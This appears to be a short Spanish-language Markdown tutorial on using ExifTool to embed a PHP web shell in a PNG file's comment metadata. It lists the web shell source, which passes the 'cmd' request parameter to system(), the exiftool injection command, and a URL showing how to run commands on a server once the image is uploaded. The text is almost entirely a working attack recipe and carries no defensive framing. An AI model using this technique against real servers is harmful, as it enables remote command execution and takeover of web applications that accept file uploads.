<h1 align="center">EXIFTOOL</h1>

###

# DEFINICIÓN

**ExifTool** es una herramienta de línea de comandos para leer, escribir y editar metadatos en archivos. Es ampliamente utilizada para manipular y gestionar información de metadatos en una variedad de formatos de archivo, incluyendo imágenes, videos, y documentos.

# INYECTAR PAYLOAD PHP EN UN ARCHIVO PNG

Para inyectar un payload PHP dentro de un archivo PNG usando exiftool y ejecutarlo a través de un navegador, sigamos estos pasos detalladamente:

## Paso 1: Preparar el Payload PHP

El primer paso es preparar el payload PHP que quieres insertar en el archivo PNG. El payload que deseas es un script PHP que permita la ejecución de comandos remotos a través de una URL. Aquí está el código PHP que quieres usar:

`<?php
if(isset($_REQUEST["cmd"])){
    echo "<pre>";
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    echo "</pre>";
    die;
}
?>
`

## Paso 2: Inyectar el Payload en el PNG con exiftool

Para inyectar el payload en el archivo PNG, usa exiftool para modificar un campo de metadatos. Asegúrate de que el archivo PNG se pueda modificar (por ejemplo, asegúrate de que no esté bloqueado o en uso).

hay un comando de exiftool para inyectar el payload en el campo de comentario del archivo PNG:

- `exiftool -comment='<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' avatar.png`

## Paso 3: Verificar la Inyección

Para verificar que el payload se ha inyectado correctamente, puedes usar exiftool para revisar los metadatos del archivo PNG:

- `exiftool avatar.png`

Esto debería mostrar los metadatos del archivo, incluyendo el campo de comentario con tu código PHP.

## Paso 4: Ejecutar el Código PHP

Una vez que hayas inyectado el payload PHP en el archivo PNG, sube el archivo a un servidor web que soporte la ejecución de scripts PHP. Accede al archivo PNG a través de la URL y pasa el parámetro cmd para ejecutar el comando.

Por ejemplo:

- `http://*IP_DEL_SERVIDOR*/avatar.png?cmd=id`

Esto debería ejecutar el comando id en el servidor y mostrar el resultado en tu navegador.
